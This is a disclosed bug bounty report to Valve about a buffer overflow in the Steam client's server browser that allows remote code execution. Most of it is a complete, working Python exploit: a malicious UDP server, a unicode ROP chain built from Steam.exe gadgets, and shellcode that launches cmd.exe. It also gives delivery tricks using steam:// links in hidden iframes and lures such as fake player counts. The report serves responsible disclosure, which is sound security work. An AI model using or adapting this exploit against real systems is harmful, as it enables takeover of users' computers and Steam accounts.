# RCE on Steam Client via buffer overflow in Server Info

## Report Details
- **Report ID**: 470520
- **URL**: https://hackerone.com/reports/470520
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-12-21T08:51:43.941Z
- **Disclosed**: 2019-03-15T19:47:43.463Z

## Reporter
- **Username**: vinnievan
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: valve

## Vulnerability Information
## Introduction

In Steam and other valve games (CSGO, Half-Life, TF2) there is a functionality to find game servers called the server browser. In order to retrieve the information about these servers the server browser communicates with a specific UDP protocol called [server queries](https://developer.valvesoftware.com/wiki/Server_queries). The protocol is well described in the online developers manual of Steam. We implemented a custom python server which only replies with the protocol using the same information available in the documentation. After a successful implementation of the protocol we fuzzed several parameters and noticed that the Steam client crashed when receiving replies from our custom server. More specifically, the client crashed when we replied with a large player name used in the `A2S_PLAYER` response. When attaching a debugger we noticed it crashed due to a stack-based buffer overflow.

This clearly indicates that something was wrong and we investigated it further to be able to exploit the buffer overflow. After further inspection, we noticed that the overflow occurred in the `serverbrowser` library. At some point the players’ name is converted into unicode and an overflow occurs because the boundaries are not checked. Also, there’s no canary protection present, which allowed us to overwrite the return address and execute arbitrary code on Windows.

## Exploit details

We wanted to prove impact and build an exploit. First, we tested it on Linux and we were able to control the execution flow instantly by overwriting the return address. However, on Linux, we were able to control two bytes of the `EIP` register only (e.g. `0x00004141`) and we didn’t explore it further. On OSX, the process terminated with `SIGABRT`, which means that there’s probably a canary protection in the library on OSX. Then, we tried to exploit it on Windows and we were successful (tested on Windows 8.1 and 10).

On Windows, sending a player name via UDP like `A*1100` would result in the following stack layout:
```
0x00410041
0x00410041
...
```

This happens due to unicode conversion (wide-char), because player names can use unicode characters. Sending a player name with unicode characters like `u"\u4141"*1100` would result in the following layout:
```
0x41414141
0x41414141
...
```

However, since we were corrupting the stack and registers before the function returns, we had no control over the `EIP` register yet. The program was crashing after dereferencing the `edi` register, but we had control over it. We satisfied these special conditions using constant values present on the `Steam.exe` binary:

{F395516}

Then, we built a unicode ROP chain with gadgets from `Steam.exe` only, to call `VirtualProtect` dynamically to make the stack executable and jump to our unicode shellcode to execute `cmd.exe`. This was a big challenge since we couldn't use values like `0x00000040` in our ROP chain, otherwise the string would be terminated. And we couldn't use invalid unicode characters like `u"\uda01"` because the library replaces them with a question mark `?` - `0x003F`.

**Note:** Everything is calculated using the `Steam.exe` base address. This address changes if you restart your Windows 8 or Windows 10, not if you relaunch Steam. The exploit is 100% reliable if you edit the base address on the exploit, but you can't predict the base address in the computer of a victim due to ASLR. However, we have two exploitation scenarios:

- Only 9 bits are randomized: An attacker can successfully exploit a victim with a probability of 0.2% (1/512), which is more than enough if we are talking about an attacker distributing this exploit massively to all Steam users (1 new victim every 512 attempts in average)
- This vulnerability can be chained with another memory leak vulnerability to make it 100% reliable

## Steps to reproduce

First, make sure that you have Steam installed. If you are using the beta version, please uncomment the beta version gadgets in the exploit code.

1 - Download the attachment: {F395515}
2 - Use a debugger like Immunity Debugger and attach to Steam.exe
3 - Grab the base address of `Steam.exe` (View > Executable modules) and edit the `STEAM_BASE` variable on `steam_serverinfo_exploit.py` to make the exploit 100% reliable
{F395520}

4 - Run the exploit on a server of your choice (e.g. localhost): `python steam_serverinfo_exploit.py`
5 - Edit `POC.html` and change the IP address of the server in the `iframe src`
6 - Open it in a browser and wait for `cmd.exe` to be executed
7 - You can also open the server browser in the menu (View > Servers) and click `View server info` to trigger the exploit (if you are running the server in the same network it will appear in the LAN section)

## PoC

{F395517}
**Steamclient_POC_Windows10.mp4**: Contains a video of the exploit being triggered on Windows 10 via manual interaction with the Steam server browser

{F395518}
**SteamURL_POC_Windows10.mp4**: Contains a video of the exploit being triggered on Windows 10 via a malicious web page containing a hidden iframe that will trigger the exploit automatically. In the video, Steam was not running when visiting the malicious page and it was automatically started. This also works when Steam is already running.

{F395519}
Contains the html page code used in the SteamURL video.

**Exploit code:**

```python
import logging
import socket
import textwrap


### Exploit for Server Info - Player Name buffer overflow (Steam.exe - Windows 8 and 10) #######
# More info: https://developer.valvesoftware.com/wiki/Server_queries
# Shellcode must contain valid unicode characters, pad with NOPs :)


STEAM_BASE = 0x01180000

# Shellcode: open cmd.exe
shellcode = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x90\x8b\x52\x78\x01\xda\x8b\x72\x20\x90\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x90\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x90\x01\xda\x31\xf6\x89\xd6\x31\xff\x89\xdf\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\x0c\x31\xc9\x68\x65\x73\x73\x42\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x57\x31\xff\x89\xc7\xff\xd6\x83\xc4\x0c\x31\xc9\x51\x68\x64\x6c\x6c\x41\x88\x4c\x24\x03\x68\x6c\x33\x32\x2e\x68\x73\x68\x65\x6c\x54\x31\xd2\x89\xfa\x89\xc7\xff\xd2\x83\xc4\x0b\x31\xc9\x68\x41\x42\x42\x42\x88\x4c\x24\x01\x68\x63\x75\x74\x65\x68\x6c\x45\x78\x65\x68\x53\x68\x65\x6c\x54\x50\xff\xd6\x83\xc4\x0d\x31\xc9\x68\x65\x78\x65\x41\x88\x4c\x24\x03\x68\x63\x6d\x64\x2e\x54\x59\x31\xd2\x42\x52\x31\xd2\x52\x52\x51\x52\x52\xff\xd0\xff\xd7"


def udp_server(host="0.0.0.0", port=27015):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("[*] Starting TSQuery UDP server on host: %s and port: %s" % (host, port))
    s.bind((host, port))
    while True:
        (data, addr) = s.recvfrom(128*1024)
        requestType = checkRequestType(data)
        if requestType == "INFO":
            response = createINFOReply()
        elif requestType == "PLAYER":
            response = createPLAYERReply()
            print("[+] Payload sent!")
        else:
            response = 'nope'
        s.sendto(response,addr)
        yield data


def checkRequestType(data):
    # Header byte contains the type of request
    header = data[4]
    if header == "\x54":
        print("[*] Received A2S_INFO request")
        return "INFO"
    elif header == "\x55":
        print("[*] Received A2S_PLAYER request")
        return "PLAYER"
    else:
        print "Unknown request"
        return "UNKNOWN"


def createINFOReply():
    # A2S_INFO response
    # Retrieves information about the server including, but not limited to: its name, the map currently being played, and the number of players.
    pre = "\xFF\xFF\xFF\xFF"                         # Pre (4 bytes)
    header = "\x49"                                  # Header (1 byte)
    protocol = "\x02"                                # Protocol version (1 byte)
    name = "@Kernelpanic and @0xacb Server" + "\x00" # Server name (string)
    map_name = "de_dust2" + "\x00" # Map name (string)
    folder = "csgo" + "\x00" # Name of the folder contianing the game files (string)
    game = "Counter-Strike: Global Offensive" + "\x00" # Game name (string)
    ID = "\xda\x02" # Game ID (short)
    players = "\xFF" # Amount of players in the server (byte)
    maxplayers = "\xFF" # Max player allowed (byte)
    bots = "\x00" # Bots in game (byte)
    server_type = "d" # Server type, d = dedicate (byte)
    environment = "l" # Hosted on windows linux or mac, l is linux (byte)
    visibility = "\x00" # Password needed? (byte)
    VAC = "\x01" # VAC enabled? (byte)
    version = "1.3.6.7.1\x00"
    return pre + header + protocol + name + map_name + folder + game + ID + players + maxplayers + bots + server_type + environment + visibility + VAC + version


def to_unicode(addr):
    a = addr & 0xffff;
    b = addr >> 16;
    return eval('u"\\u%s\\u%s"' % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))


def convert_addr(gadget):
    return to_unicode(STEAM_BASE + gadget - 0x400000)


def convert_shellcode(code):
    code = code + "\x90"*8 #pad with nops
    output = ""
    l = textwrap.wrap(code.encode("hex"), 2)
    for i in range(0, len(l)-4, 4):
        output += "\\u%s%s\\u%s%s" % (l[i+1], l[i], l[i+3], l[i+2])
    return eval('u"%s"' % output)


def pwn():
    print("[*] Building ROP chain")

    # ROP gadgets for Steam.exe Nov 26 2018
    pop_eax = convert_addr(0x503ca7)
    pop_ecx = convert_addr(0x41bd9f)
    pop_edx = convert_addr(0x413a53)
    pop_ebx = convert_addr(0x40511c)
    pop_ebp = convert_addr(0x40247c)
    pop_esi = convert_addr(0x404de6)
    pop_edi = convert_addr(0x423839)
    jmp_esp = convert_addr(0x4413bd)
    pushad = convert_addr(0x425e00)
    ret_nop = convert_addr(0x401212)
    mov_edx_eax = convert_addr(0x5599a6)
    sub_eax_41e82c6a = convert_addr(0x51584f)
    mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e24eb)
    mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)
    xchg_eax_esi = convert_addr(0x543b86)

    writable_addr = convert_addr(0x69a01c)
    virtual_protect_idata = convert_addr(0x5f9280)
    new_protect = to_unicode(0x41e82c6a+0x40)
    msize = to_unicode(0x41e82c6a+0x501)

    '''
    # ROP gadgets for Steam.exe Beta Dec 14 2018
    pop_eax = convert_addr(0x425993)
    pop_ecx = convert_addr(0x41bd9f)
    pop_edx = convert_addr(0x413a53)
    pop_ebx = convert_addr(0x40511c)
    pop_ebp = convert_addr(0x40247c)
    pop_esi = convert_addr(0x404de6)
    pop_edi = convert_addr(0x423839)
    jmp_esp = convert_addr(0x4413bd)
    pushad = convert_addr(0x425e00)
    ret_nop = convert_addr(0x401212)
    mov_edx_eax = convert_addr(0x559d46)
    sub_eax_31e82c6a = convert_addr(0x515bbf)
    mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret = convert_addr(0x4e284b)
    mov_esi_ptr_esi_mov_eax_esi_pop_esi = convert_addr(0x4506ea)
    xchg_eax_esi = convert_addr(0x515b5e)

    writable_addr = convert_addr(0x69a01c)
    virtual_protect_idata = convert_addr(0x5fa280)
    new_protect = to_unicode(0x31e82c6a+0x40)
    msize = to_unicode(0x31e82c6a+0x501)
    '''

    rop = pop_eax + msize + sub_eax_41e82c6a + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret \
              + u"\ub33f\ubeef" + mov_ebx_ecx_mov_ecx_eax_mov_eax_esi_pop_esi_ret + ret_nop*0x10 \
              + pop_ecx + writable_addr \
              + pop_eax + new_protect + sub_eax_41e82c6a + mov_edx_eax \
              + pop_ebp + jmp_esp + pop_esi + virtual_protect_idata \
              + mov_esi_ptr_esi_mov_eax_esi_pop_esi + u"\ub33f\ubeef" + xchg_eax_esi + pop_edi \
              + ret_nop + pop_eax + u"\u9090\u9090" + pushad

    #special conditions to avoid crashes
    special_condition_1 = to_unicode(STEAM_BASE + 0x10)
    special_condition_2 = to_unicode(STEAM_BASE + 0x11)
    payload = "A"*1024 + u"\ub33f\ubeef"*12 + special_condition_1 + special_condition_2*31 + rop + shellcode
    return payload.encode("utf-8") + "\x00"


def createPLAYERReply():
    # A2S_player response
    # This query retrieves information about the players currently on the server.
    pre = "\xFF\xFF\xFF\xFF"                        # Pre (4 bytes)
    header = "\x44"                                 # Header (1 byte)
    players = "\x01"                                # Amount of players (1 byte)
    indexPlayer1 = "\x01"                           # Index of player (1 byte)

    namePlayer2 = pwn()
    scorePlayer2 = ""
    durationPlayer2  = ""
    return pre + header + players + indexPlayer1 + namePlayer2 + scorePlayer2 + durationPlayer2


FORMAT_CONS = '%(asctime)s %(name)-12s %(levelname)8s\t%(message)s'
logging.basicConfig(level=logging.DEBUG, format=FORMAT_CONS)

if __name__ == "__main__":
    shellcode = convert_shellcode(shellcode)
    for data in udp_server():
        pass
```

## Impact

An attacker can execute arbitrary code on the computer of any Steam user who views the server info of our malicious server. Usually an attacker would initiate a backdoor connection to a C2 infrastructure to gain access to the computer of the victim. From there on an attacker could do whatever he/she wants (e.g. account takeover, steal all items from the steam account, install additional malware in the OS, exfiltrate documents, etc.)

There are several ways to trick a user into running the exploit:
- User views the Server Info in the Steam client server browser
- User visits a malicious web page of an attacker where a [Steam browser protocol](https://developer.valvesoftware.com/wiki/Steam_browser_protocol) request is initiated: `steam://connect/1.2.3.4`

Additionally there are a few ways that increase the likelihood of this attack:
- It can be triggered via a website using the steam browser protocol
- Lots of users don’t need to click the `Open Steam` button on the browser (Always open these types of links in the associated app ✓)
- The first Info Reply that doesn’t contain the exploit can have interesting values to trick the user. 
  - The server name can be chosen and can trick the user to use the server
  - By setting the current amount of players high people are more likely to join
  - Map name could also contain interesting text as values to lure people
  - If the amount of players in the server is equal the maximum allowed players in the server then the server info box is automatically opened and the exploit executes successfully after the first automatic refresh

Best regards,
Vinnie Vanhoecke @vinnievan and André Baptista @0xacb

## Attachments
- steam_serverinfo_exploit.py
- special_condition.png
- Steamclient_POC_Windows10.mp4
- SteamURL_POC_Windows10.mp4
- POC.html
- steam_base_address.png
